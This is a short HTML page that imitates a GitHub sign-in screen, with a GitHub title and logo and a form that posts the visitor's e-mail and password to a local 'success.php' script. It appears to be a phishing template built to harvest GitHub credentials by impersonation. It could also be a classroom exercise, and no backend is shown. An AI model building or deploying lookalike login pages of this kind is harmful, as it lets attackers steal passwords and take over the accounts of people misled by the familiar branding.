<!DOCTYPE html>
<html lang="en">
<head>
    <title>Sign in - Github</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
    <link href="stil.css" type="text/css" rel="stylesheet"/>

</head>
<body>
<div class="container main_div">
<div class="container">
    <img alt="Github" src="github.png" class="image_settings">
</div>

<div class="container" style="margin-top: 10px">
    <h4 style="text-align: center">Please sign in</h4>
    <form class="form_style" action="success.php" method="post">
        <input class="form_input" type="email" placeholder="E-mail" name="email"><br>
        <input class="form_input" type="password" placeholder="Password" name="password"><br>
        <input type="checkbox" name="remember">
        <label>Remember me</label><br>
        <input class="form_submit" type="submit" value="Sign in" name="signin">
    </form>

</div>
</div>

</body>
</html>